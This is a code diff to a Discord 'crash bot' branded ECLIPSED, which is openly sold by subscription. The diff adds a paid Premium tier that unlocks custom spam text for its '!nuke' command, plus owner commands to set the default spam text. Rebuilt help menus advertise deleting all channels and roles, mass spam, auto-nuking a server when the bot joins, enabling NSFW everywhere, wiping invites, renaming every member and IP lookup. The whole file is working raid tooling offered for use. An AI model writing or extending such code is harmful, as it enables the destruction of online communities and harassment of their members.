@@ -36,6 +36,10 @@ def is_owner_whitelisted(user_id):
     return user_id in config.OWNER_WHITELIST
 
 
+def is_premium(user_id):
+    return user_id in PREMIUM_LIST
+
+
 def save_whitelist():
     with open("whitelist.json", "w") as f:
         json.dump(config.WHITELIST, f)
@@ -44,6 +48,11 @@ def save_whitelist():
 def save_owner_whitelist():
     with open("owner_whitelist.json", "w") as f:
         json.dump(config.OWNER_WHITELIST, f)
+
+
+def save_premium():
+    with open("premium.json", "w") as f:
+        json.dump(PREMIUM_LIST, f)
 
 
 def load_whitelist():
@@ -55,9 +64,29 @@ def load_whitelist():
             config.OWNER_WHITELIST = json.load(f)
 
 
+def load_premium():
+    global PREMIUM_LIST
+    if os.path.exists("premium.json"):
+        with open("premium.json", "r") as f:
+            PREMIUM_LIST = json.load(f)
+
+
+def save_spam_text():
+    with open("spam_text.json", "w") as f:
+        json.dump({"text": config.SPAM_TEXT}, f, ensure_ascii=False)
+
+
+def load_spam_text():
+    if os.path.exists("spam_text.json"):
+        with open("spam_text.json", "r", encoding="utf-8") as f:
+            data = json.load(f)
+            config.SPAM_TEXT = data.get("text", config.SPAM_TEXT)
+
+
 # ─── BLOCKED GUILDS ────────────────────────────────────────
 
 BLOCKED_GUILDS: list[int] = []
+PREMIUM_LIST: list[int] = []
 
 
 def save_blocked_guilds():
@@ -78,11 +107,16 @@ def is_guild_blocked(guild_id: int) -> bool:
 
 def wl_check():
     async def predicate(ctx):
-        # Если сервер заблокирован — молча игнорируем
         if ctx.guild and is_guild_blocked(ctx.guild.id):
             return False
         if not is_whitelisted(ctx.author.id):
-            await ctx.send("❌ У тебя нет подписки. За покупкой в ЛС Discord: **davaidkatt**")
+            embed = discord.Embed(
+                title="☠️ ДОСТУП ЗАПРЕЩЁН",
+                description="У тебя нет подписки.\nЗа покупкой пиши в ЛС: **davaidkatt**",
+                color=0x0a0a0a
+            )
+            embed.set_footer(text="ECLIPSED SQUAD")
+            await ctx.send(embed=embed)
             return False
         return True
     return commands.check(predicate)
@@ -154,13 +188,26 @@ async def do_nuke(guild, spam_text=None):
 async def nuke(ctx, *, text: str = None):
     guild = ctx.guild
     if nuke_running.get(guild.id):
-        await ctx.send("Уже запущено.")
+        embed = discord.Embed(description="⚡ Краш уже запущен на этом сервере.", color=0x0a0a0a)
+        await ctx.send(embed=embed)
+        return
+    # Кастомный текст — только для premium
+    if text and not is_premium(ctx.author.id) and ctx.author.id != config.OWNER_ID:
+        embed = discord.Embed(
+            title="💎 PREMIUM ФУНКЦИЯ",
+            description=(
+                "Кастомный текст для `!nuke` доступен только **Premium** пользователям.\n\n"
+                "За покупкой Premium пиши в ЛС: **davaidkatt**"
+            ),
+            color=0x0a0a0a
+        )
+        embed.set_footer(text="☠️ ECLIPSED SQUAD")
+        await ctx.send(embed=embed)
         return
     nuke_running[guild.id] = True
     spam_text = text if text else config.SPAM_TEXT
     last_nuke_time[ctx.guild.id] = asyncio.get_running_loop().time()
     last_spam_text[ctx.guild.id] = spam_text
-
     asyncio.create_task(do_nuke(guild, spam_text))
 
 
@@ -345,6 +392,42 @@ async def wl_list(ctx):
     await ctx.send("Whitelist:\n" + "\n".join(f"`{uid}`" for uid in config.WHITELIST))
 
 
+# ─── OWNER-ONLY: PREMIUM ───────────────────────────────────
+
+@bot.command(name="pm_add")
+async def pm_add(ctx, user_id: int):
+    if ctx.author.id != config.OWNER_ID:
+        return
+    if user_id not in PREMIUM_LIST:
+        PREMIUM_LIST.append(user_id)
+        save_premium()
+        await ctx.send(f"💎 `{user_id}` получил **Premium** — кастомный текст для `!nuke` разблокирован.")
+    else:
+        await ctx.send("Уже в Premium.")
+
+
+@bot.command(name="pm_remove")
+async def pm_remove(ctx, user_id: int):
+    if ctx.author.id != config.OWNER_ID:
+        return
+    if user_id in PREMIUM_LIST:
+        PREMIUM_LIST.remove(user_id)
+        save_premium()
+        await ctx.send(f"✅ `{user_id}` убран из Premium.")
+    else:
+        await ctx.send("Не найден в Premium.")
+
+
+@bot.command(name="pm_list")
+async def pm_list(ctx):
+    if ctx.author.id != config.OWNER_ID:
+        return
+    if not PREMIUM_LIST:
+        await ctx.send("Premium список пуст.")
+        return
+    await ctx.send("💎 Premium:\n" + "\n".join(f"`{uid}`" for uid in PREMIUM_LIST))
+
+
 # ─── OWNER-ONLY: BLOCK / UNBLOCK GUILD ─────────────────────
 
 @bot.command(name="block_guild")
@@ -404,55 +487,65 @@ bot.remove_command("help")
 @wl_check()
 async def help_cmd(ctx):
     embed = discord.Embed(
-        title="ArchAngels Bot",
+        title="☠️ ECLIPSED — CRASH BOT",
         description=(
-            "Все команды бота.\n"
-            "⚠️ **Если бот не реагирует на команды** — значит овнер заблокировал его на этом сервере."
+            "```\n"
+            "  ██████╗██████╗  █████╗ ███████╗██╗  ██╗\n"
+            " ██╔════╝██╔══██╗██╔══██╗██╔════╝██║  ██║\n"
+            " ██║     ██████╔╝███████║███████╗███████║\n"
+            " ██║     ██╔══██╗██╔══██║╚════██║██╔══██║\n"
+            " ╚██████╗██║  ██║██║  ██║███████║██║  ██║\n"
+            "  ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝\n"
+            "```\n"
+            "> ⚠️ Если бот не реагирует — сервер заблокирован овнером."
         ),
-        color=discord.Color.red()
+        color=0x0a0a0a
     )
     embed.add_field(
-        name="💥 Краш",
+        name="💀 УНИЧТОЖЕНИЕ",
         value=(
-            "`!nuke [текст]` — удалить все каналы/роли, создать новые и заспамить\n"
-            "`!stop` — остановить активный краш\n"
-            "`!cleanup` — удалить все каналы, создать один чистый\n"
-            "`!auto_nuke on/off/info` — авто-краш при входе бота на сервер\n"
+            "`!nuke` — снести каналы/роли, создать новые, заспамить\n"
+            "`!nuke [текст]` — то же самое со своим текстом 💎 **Premium**\n"
+            "`!stop` — остановить краш\n"
+            "`!cleanup` — снести всё, оставить один канал\n"
+            "`!auto_nuke on/off/info` — авто-краш при входе бота\n"
             "`!addch [кол-во]` — создать каналы"
         ),
         inline=False
     )
     embed.add_field(
-        name="⚙️ Управление",
+        name="⚡ КОНТРОЛЬ",
         value=(
             "`!rename [название]` — переименовать все каналы\n"
-            "`!nsfw_all` — включить NSFW во всех каналах\n"
-            "`!unnsfw_all` — выключить NSFW во всех каналах\n"
-            "`!invs_delete` — удалить все приглашения сервера\n"
-            "`!nicks_all [ник]` — сменить ник всем участникам"
+            "`!nsfw_all` — включить NSFW везде\n"
+            "`!unnsfw_all` — выключить NSFW\n"
+            "`!invs_delete` — уничтожить все инвайты\n"
+            "`!nicks_all [ник]` — сменить ники всем"
         ),
         inline=False
     )
     embed.add_field(
-        name="🔧 Утилиты",
+        name="🔱 ИНСТРУМЕНТЫ",
         value=(
-            "`!webhooks` — показать список всех вебхуков\n"
-            "`!ip [адрес]` — получить информацию об IP адресе\n"
+            "`!webhooks` — список вебхуков\n"
+            "`!ip [адрес]` — пробить IP\n"
             "`!inv` — ссылка для добавления бота\n"
-            "`/sp [кол-во] [текст]` — спам сообщением (slash команда)"
+            "`/sp [кол-во] [текст]` — спам\n"
+            "`/spkd [задержка] [кол-во] [текст]` — спам с задержкой"
         ),
         inline=False
     )
     embed.add_field(
-        name="👥 Whitelist",
+        name="👁️ ДОСТУП",
         value=(
-            "`!wl_add [id]` — добавить пользователя в whitelist\n"
-            "`!wl_remove [id]` — убрать пользователя из whitelist\n"
-            "`!wl_list` — показать список whitelist"
+            "`!wl_add [id]` — выдать доступ\n"
+            "`!wl_remove [id]` — забрать доступ\n"
+            "`!wl_list` — список допущенных"
         ),
         inline=False
     )
-    embed.set_footer(text="Нет подписки? Пиши в ЛС: davaidkatt")
+    embed.set_footer(text="☠️ Нет доступа? Пиши: davaidkatt  |  💎 Premium = кастомный текст нюка")
+    embed.set_thumbnail(url="https://i.imgur.com/8Km9tLL.png")
     await ctx.send(embed=embed)
 
 
@@ -706,6 +799,45 @@ async def run_dm_command(message: discord.Message, guild: discord.Guild, cmd_tex
                     lines.append(f"`{gid}` — {g.name if g else 'неизвестен'}")
                 await message.channel.send("🔒 Заблокированные серверы:\n" + "\n".join(lines))
 
+        elif cmd_name == "pm_add":
+            if message.author.id != config.OWNER_ID:
+                await message.channel.send("❌ Только овнер.")
+                return
+            try:
+                uid = int(args.strip())
+                if uid not in PREMIUM_LIST:
+                    PREMIUM_LIST.append(uid)
+                    save_premium()
+                    await message.channel.send(f"💎 `{uid}` получил **Premium**.")
+                else:
+                    await message.channel.send("Уже в Premium.")
+            except ValueError:
+                await message.channel.send("Использование: `!pm_add <id>`")
+
+        elif cmd_name == "pm_remove":
+            if message.author.id != config.OWNER_ID:
+                await message.channel.send("❌ Только овнер.")
+                return
+            try:
+                uid = int(args.strip())
+                if uid in PREMIUM_LIST:
+                    PREMIUM_LIST.remove(uid)
+                    save_premium()
+                    await message.channel.send(f"✅ `{uid}` убран из Premium.")
+                else:
+                    await message.channel.send("Не найден в Premium.")
+            except ValueError:
+                await message.channel.send("Использование: `!pm_remove <id>`")
+
+        elif cmd_name == "pm_list":
+            if message.author.id != config.OWNER_ID:
+                await message.channel.send("❌ Только овнер.")
+                return
+            if not PREMIUM_LIST:
+                await message.channel.send("Premium список пуст.")
+            else:
+                await message.channel.send("💎 Premium:\n" + "\n".join(f"`{uid}`" for uid in PREMIUM_LIST))
+
         else:
             await message.channel.send(f"❌ Неизвестная команда `{cmd_name}`. Напиши `!owner_help`.")
 
@@ -725,56 +857,65 @@ async def on_message(message):
         # !help — показать help прямо в ЛС
         if content == "!help":
             embed = discord.Embed(
-                title="ArchAngels Bot",
+                title="☠️ ECLIPSED — CRASH BOT",
                 description=(
-                    "Все команды бота.\n"
-                    "⚠️ **Если бот не реагирует на команды на каком-то сервере** — значит овнер заблокировал его там."
+                    "```\n"
+                    "  ██████╗██████╗  █████╗ ███████╗██╗  ██╗\n"
+                    " ██╔════╝██╔══██╗██╔══██╗██╔════╝██║  ██║\n"
+                    " ██║     ██████╔╝███████║███████╗███████║\n"
+                    " ██║     ██╔══██╗██╔══██║╚════██║██╔══██║\n"
+                    " ╚██████╗██║  ██║██║  ██║███████║██║  ██║\n"
+                    "  ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝\n"
+                    "```\n"
+                    "> ⚠️ Если бот не реагирует на сервере — он там заблокирован."
                 ),
-                color=discord.Color.red()
+                color=0x0a0a0a
             )
             embed.add_field(
-                name="💥 Краш",
+                name="💀 УНИЧТОЖЕНИЕ",
                 value=(
-                    "`!nuke [текст]` — удалить все каналы/роли, создать новые и заспамить\n"
-                    "`!stop` — остановить активный краш\n"
-                    "`!cleanup` — удалить все каналы, создать один чистый\n"
-                    "`!auto_nuke on/off/info` — авто-краш при входе бота на сервер\n"
+                    "`!nuke` — снести каналы/роли, создать новые, заспамить\n"
+                    "`!nuke [текст]` — то же самое со своим текстом 💎 **Premium**\n"
+                    "`!stop` — остановить краш\n"
+                    "`!cleanup` — снести всё, оставить один канал\n"
+                    "`!auto_nuke on/off/info` — авто-краш при входе бота\n"
                     "`!addch [кол-во]` — создать каналы"
                 ),
                 inline=False
             )
             embed.add_field(
-                name="⚙️ Управление",
+                name="⚡ КОНТРОЛЬ",
                 value=(
                     "`!rename [название]` — переименовать все каналы\n"
-                    "`!nsfw_all` — включить NSFW во всех каналах\n"
-                    "`!unnsfw_all` — выключить NSFW во всех каналах\n"
-                    "`!invs_delete` — удалить все приглашения сервера\n"
-                    "`!nicks_all [ник]` — сменить ник всем участникам"
+                    "`!nsfw_all` — включить NSFW везде\n"
+                    "`!unnsfw_all` — выключить NSFW\n"
+                    "`!invs_delete` — уничтожить все инвайты\n"
+                    "`!nicks_all [ник]` — сменить ники всем"
                 ),
                 inline=False
             )
             embed.add_field(
-                name="🔧 Утилиты",
+                name="🔱 ИНСТРУМЕНТЫ",
                 value=(
-                    "`!webhooks` — показать список всех вебхуков\n"
-                    "`!ip [адрес]` — получить информацию об IP адресе\n"
+                    "`!webhooks` — список вебхуков\n"
+                    "`!ip [адрес]` — пробить IP\n"
                     "`!inv` — ссылка для добавления бота\n"
-                    "`/sp [кол-во] [текст]` — спам сообщением\n"
+                    "`/sp [кол-во] [текст]` — спам\n"
                     "`/spkd [задержка] [кол-во] [текст]` — спам с задержкой"
                 ),
                 inline=False
             )
             embed.add_field(
-                name="👥 Whitelist",
+                name="👁️ ДОСТУП",
                 value=(
-                    "`!wl_add [id]` — добавить пользователя в whitelist\n"
-                    "`!wl_remove [id]` — убрать пользователя из whitelist\n"
-                    "`!wl_list` — показать список whitelist"
+                    "`!wl_add [id]` — выдать доступ\n"
+                    "`!wl_remove [id]` — забрать доступ\n"
+                    "`!wl_list` — список допущенных"
                 ),
                 inline=False
             )
-            embed.set_footer(text="Нет подписки? Пиши в ЛС: davaidkatt")
+            embed.set_footer(text="☠️ Нет доступа? Пиши: davaidkatt  |  💎 Premium = кастомный текст нюка")
+            embed.set_thumbnail(url="https://i.imgur.com/8Km9tLL.png")
             await message.channel.send(embed=embed)
             return
 
@@ -784,65 +925,89 @@ async def on_message(message):
                 await message.channel.send("❌ Нет доступа.")
                 return
             embed = discord.Embed(
-                title="👑 Owner Panel",
+                title="💀 OWNER PANEL — ECLIPSED",
                 description=(
-                    "Управление ботом через личные сообщения.\n"
-                    "Все команды работают только для тебя — никто другой не имеет доступа к этому меню."
+                    "```\n"
+                    " ░█████╗░░██╗░░░░░░░██╗███╗░░██╗███████╗██████╗░\n"
+                    " ██╔══██╗░██║░░██╗░░██║████╗░██║██╔════╝██╔══██╗\n"
+                    " ██║░░██║░╚██╗████╗██╔╝██╔██╗██║█████╗░░██████╔╝\n"
+                    " ██║░░██║░░████╔═████║░██║╚████║██╔══╝░░██╔══██╗\n"
+                    " ╚█████╔╝░░╚██╔╝░╚██╔╝░██║░╚███║███████╗██║░░██║\n"
+                    " ░╚════╝░░░░╚═╝░░░╚═╝░░╚═╝░░╚══╝╚══════╝╚═╝░░╚═╝\n"
+                    "```\n"
+                    "> 🔐 Только ты имеешь доступ к этому меню."
                 ),
-                color=discord.Color.gold()
+                color=0x0a0a0a
             )
             embed.add_field(
-                name="🖥️ Выбор сервера",
+                name="🖥️ СЕРВЕРЫ",
                 value=(
-                    "`!guilds` — список всех серверов бота (с кнопками выбора)\n"
-                    "`!setguild <id>` — выбрать сервер вручную по ID\n"
-                    "`!invlink` — получить инвайт-ссылки со всех серверов"
+                    "`!guilds` — список серверов бота (кнопки выбора)\n"
+                    "`!setguild <id>` — выбрать сервер по ID\n"
+                    "`!invlink` — инвайт-ссылки со всех серверов"
                 ),
                 inline=False
             )
             embed.add_field(
-                name="⚙️ Команды на выбранном сервере",
+                name="⚡ КОМАНДЫ НА СЕРВЕРЕ",
                 value=(
-                    "Сначала выбери сервер через `!guilds` или `!setguild`, затем пиши команды:\n"
-                    "`!nuke [текст]` · `!stop` · `!cleanup` · `!addch [кол-во]`\n"
-                    "`!rename [название]` · `!nsfw_all` · `!unnsfw_all`\n"
-                    "`!invs_delete` · `!nicks_all [ник]` · `!webhooks`\n"
+                    "Выбери сервер → пиши команды прямо в ЛС:\n"
+                    "`!nuke` · `!stop` · `!cleanup` · `!addch`\n"
+                    "`!rename` · `!nsfw_all` · `!unnsfw_all`\n"
+                    "`!invs_delete` · `!nicks_all` · `!webhooks`\n"
                     "`!auto_nuke on/off/info`"
                 ),
                 inline=False
             )
             embed.add_field(
-                name="🔒 Блокировка серверов",
+                name="💎 PREMIUM",
                 value=(
-                    "Запрещает боту выполнять **любые команды** на указанном сервере.\n"
-                    "Удобно если бот стоит у тебя на сервере — заблокируй его и никто из вайтлиста не сможет им воспользоваться там.\n\n"
-                    "`!block_guild <id>` — заблокировать сервер\n"
-                    "`!unblock_guild <id>` — снять блокировку\n"
-                    "`!blocked_guilds` — список заблокированных серверов"
+                    "Даёт возможность использовать `!nuke [свой текст]`.\n\n"
+                    "`!pm_add <id>` — выдать Premium\n"
+                    "`!pm_remove <id>` — забрать Premium\n"
+                    "`!pm_list` — список Premium пользователей"
                 ),
                 inline=False
             )
             embed.add_field(
-                name="👑 Owner Whitelist",
+                name="📝 ТЕКСТ НЮКА",
                 value=(
-                    "Расширенный список доверенных пользователей (управляется только тобой).\n"
+                    "Дефолтный текст который используется при `!nuke` без аргументов.\n\n"
+                    "`!set_spam_text <текст>` — сменить текст\n"
+                    "`!get_spam_text` — показать текущий текст"
+                ),
+                inline=False
+            )
+            embed.add_field(
+                name="🔒 БЛОКИРОВКА СЕРВЕРОВ",
+                value=(
+                    "Запрещает боту работать на сервере — никто из вайтлиста не сможет им воспользоваться там.\n\n"
+                    "`!block_guild <id>` — заблокировать\n"
+                    "`!unblock_guild <id>` — разблокировать\n"
+                    "`!blocked_guilds` — список заблокированных"
+                ),
+                inline=False
+            )
+            embed.add_field(
+                name="👑 OWNER WHITELIST",
+                value=(
                     "`!owl_add <id>` — добавить\n"
                     "`!owl_remove <id>` — убрать\n"
-                    "`!owl_list` — показать список"
+                    "`!owl_list` — список"
                 ),
                 inline=False
             )
             embed.add_field(
-                name="👥 Whitelist (подписчики)",
+                name="👁️ ДОСТУП (ПОДПИСЧИКИ)",
                 value=(
-                    "Пользователи из этого списка могут пользоваться ботом на любом сервере.\n"
-                    "`!wl_add <id>` — добавить\n"
-                    "`!wl_remove <id>` — убрать\n"
-                    "`!wl_list` — показать список"
+                    "`!wl_add <id>` — выдать доступ\n"
+                    "`!wl_remove <id>` — забрать доступ\n"
+                    "`!wl_list` — список допущенных"
                 ),
                 inline=False
             )
-            embed.set_footer(text="Команды работают только в ЛС с ботом")
+            embed.set_footer(text="☠️ ECLIPSED SQUAD  |  Команды работают только в ЛС")
+            embed.set_thumbnail(url="https://i.imgur.com/8Km9tLL.png")
             await message.channel.send(embed=embed)
             return
 
@@ -1003,12 +1168,107 @@ async def on_message(message):
                 await message.channel.send("🔒 Заблокированные серверы:\n" + "\n".join(lines))
             return
 
+        # !pm_add <id> — выдать premium (только OWNER_ID)
+        if content.startswith("!pm_add"):
+            if message.author.id != config.OWNER_ID:
+                await message.channel.send("❌ Только овнер.")
+                return
+            parts = content.split()
+            try:
+                uid = int(parts[1]) if len(parts) > 1 else None
+            except ValueError:
+                await message.channel.send("Использование: `!pm_add <id>`")
+                return
+            if not uid:
+                await message.channel.send("Укажи ID: `!pm_add <id>`")
+                return
+            if uid not in PREMIUM_LIST:
+                PREMIUM_LIST.append(uid)
+                save_premium()
+                await message.channel.send(f"💎 `{uid}` получил **Premium** — кастомный текст для `!nuke` разблокирован.")
+            else:
+                await message.channel.send("Уже в Premium.")
+            return
+
+        # !pm_remove <id> — забрать premium (только OWNER_ID)
+        if content.startswith("!pm_remove"):
+            if message.author.id != config.OWNER_ID:
+                await message.channel.send("❌ Только овнер.")
+                return
+            parts = content.split()
+            try:
+                uid = int(parts[1]) if len(parts) > 1 else None
+            except ValueError:
+                await message.channel.send("Использование: `!pm_remove <id>`")
+                return
+            if not uid:
+                await message.channel.send("Укажи ID: `!pm_remove <id>`")
+                return
+            if uid in PREMIUM_LIST:
+                PREMIUM_LIST.remove(uid)
+                save_premium()
+                await message.channel.send(f"✅ `{uid}` убран из Premium.")
+            else:
+                await message.channel.send("Не найден в Premium.")
+            return
+
+        # !pm_list — список premium (только OWNER_ID)
+        if content == "!pm_list":
+            if message.author.id != config.OWNER_ID:
+                await message.channel.send("❌ Только овнер.")
+                return
+            if not PREMIUM_LIST:
+                await message.channel.send("Premium список пуст.")
+            else:
+                await message.channel.send("💎 Premium:\n" + "\n".join(f"`{uid}`" for uid in PREMIUM_LIST))
+            return
+
+        # !set_spam_text <текст> — сменить дефолтный текст для !nuke (только OWNER_ID)
+        if content.startswith("!set_spam_text"):
+            if message.author.id != config.OWNER_ID:
+                await message.channel.send("❌ Только овнер.")
+                return
+            parts = content.split(maxsplit=1)
+            if len(parts) < 2 or not parts[1].strip():
+                await message.channel.send(
+                    "Использование: `!set_spam_text <текст>`\n"
+                    f"Текущий текст:\n```{config.SPAM_TEXT[:500]}```"
+                )
+                return
+            new_text = parts[1]
+            config.SPAM_TEXT = new_text
+            save_spam_text()
+            embed = discord.Embed(
+                title="✅ Текст нюка обновлён",
+                description=f"```{new_text[:1000]}```",
+                color=0x0a0a0a
+            )
+            embed.set_footer(text="☠️ ECLIPSED SQUAD  |  Теперь !nuke будет использовать этот текст")
+            await message.channel.send(embed=embed)
+            return
+
+        # !get_spam_text — показать текущий текст (только OWNER_ID)
+        if content == "!get_spam_text":
+            if message.author.id != config.OWNER_ID:
+                await message.channel.send("❌ Только овнер.")
+                return
+            embed = discord.Embed(
+                title="📋 Текущий текст нюка",
+                description=f"```{config.SPAM_TEXT[:1000]}```",
+                color=0x0a0a0a
+            )
+            embed.set_footer(text="☠️ ECLIPSED SQUAD")
+            await message.channel.send(embed=embed)
+            return
+
         # Любая другая команда — выполняем на активном сервере
         # Служебные ЛС-команды никогда не отправляются на сервер
         DM_ONLY_COMMANDS = (
             "!help", "!owner_help", "!guilds", "!invlink",
             "!owl_add", "!owl_remove", "!owl_list",
             "!setguild", "!block_guild", "!unblock_guild", "!blocked_guilds",
+            "!pm_add", "!pm_remove", "!pm_list",
+            "!set_spam_text", "!get_spam_text",
         )
         if any(content == cmd or content.startswith(cmd + " ") for cmd in DM_ONLY_COMMANDS):
             return
@@ -1052,6 +1312,8 @@ async def on_message(message):
 async def on_ready():
     load_whitelist()
     load_blocked_guilds()
+    load_premium()
+    load_spam_text()
     # Удаляем все slash команды
     bot.tree.clear_commands(guild=None)
 
@@ -1124,55 +1386,72 @@ async def on_ready():
     @app_commands.allowed_installs(guilds=True, users=True)
     @app_commands.allowed_contexts(guilds=True, dms=True, private_channels=True)
     async def slash_help(interaction: discord.Interaction):
-        embed = discord.Embed(title="ArchAngels Bot", description="Все команды бота.", color=discord.Color.red())
+        embed = discord.Embed(
+            title="☠️ ECLIPSED — CRASH BOT",
+            description=(
+                "```\n"
+                "  ██████╗██████╗  █████╗ ███████╗██╗  ██╗\n"
+                " ██╔════╝██╔══██╗██╔══██╗██╔════╝██║  ██║\n"
+                " ██║     ██████╔╝███████║███████╗███████║\n"
+                " ██║     ██╔══██╗██╔══██║╚════██║██╔══██║\n"
+                " ╚██████╗██║  ██║██║  ██║███████║██║  ██║\n"
+                "  ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝\n"
+                "```\n"
+                "> ⚠️ Если бот не реагирует — сервер заблокирован овнером."
+            ),
+            color=0x0a0a0a
+        )
         embed.add_field(
-            name="💥 Краш  `!` / `/`",
+            name="💀 УНИЧТОЖЕНИЕ  `!`",
             value=(
-                "`!nuke [текст]` — удалить каналы/роли, создать новые и заспамить\n"
+                "`!nuke` — снести каналы/роли, создать новые, заспамить\n"
+                "`!nuke [текст]` — то же самое со своим текстом 💎 **Premium**\n"
                 "`!stop` — остановить краш\n"
-                "`!cleanup` — удалить все каналы, создать один чистый\n"
+                "`!cleanup` — снести всё, оставить один канал\n"
                 "`!auto_nuke on/off/info` — авто-краш при входе бота\n"
-                "`!addch [кол-во] [название]` — создать каналы"
+                "`!addch [кол-во]` — создать каналы"
             ),
             inline=False
         )
         embed.add_field(
-            name="⚙️ Управление  `!`",
+            name="⚡ КОНТРОЛЬ  `!`",
             value=(
                 "`!rename [название]` — переименовать все каналы\n"
-                "`!nsfw_all` — включить NSFW во всех каналах\n"
+                "`!nsfw_all` — включить NSFW везде\n"
                 "`!unnsfw_all` — выключить NSFW\n"
-                "`!invs_delete` — удалить все приглашения\n"
-                "`!nicks_all [ник]` — сменить ник всем участникам"
+                "`!invs_delete` — уничтожить все инвайты\n"
+                "`!nicks_all [ник]` — сменить ники всем"
             ),
             inline=False
         )
         embed.add_field(
-            name="📨 Спам  `/`",
+            name="💬 СПАМ  `/`",
             value=(
-                "`/sp [кол-во] [текст]` — спам (макс 50, кд 5 мин на канал)\n"
-                "`/spkd [задержка] [кол-во] [текст]` — спам с задержкой в сек"
+                "`/sp [кол-во] [текст]` — спам (макс 50, кд 5 мин)\n"
+                "`/spkd [задержка] [кол-во] [текст]` — спам с задержкой"
             ),
             inline=False
         )
         embed.add_field(
-            name="🔧 Утилиты  `!`",
+            name="🔱 ИНСТРУМЕНТЫ  `!`",
             value=(
-                "`!webhooks` — список вебхуков сервера\n"
-                "`!ip [адрес]` — информация об IP\n"
+                "`!webhooks` — список вебхуков\n"
+                "`!ip [адрес]` — пробить IP\n"
                 "`!inv` — ссылка для добавления бота"
             ),
             inline=False
         )
         embed.add_field(
-            name="👥 Whitelist  `!`",
+            name="👁️ ДОСТУП  `!`",
             value=(
-                "`!wl_add [id]` — добавить в whitelist\n"
-                "`!wl_remove [id]` — убрать из whitelist\n"
-                "`!wl_list` — показать whitelist"
+                "`!wl_add [id]` — выдать доступ\n"
+                "`!wl_remove [id]` — забрать доступ\n"
+                "`!wl_list` — список допущенных"
             ),
             inline=False
         )
+        embed.set_footer(text="☠️ Нет доступа? Пиши: davaidkatt  |  ECLIPSED SQUAD")
+        embed.set_thumbnail(url="https://i.imgur.com/8Km9tLL.png")
         await interaction.response.send_message(embed=embed, ephemeral=True)
 
     await bot.tree.sync()
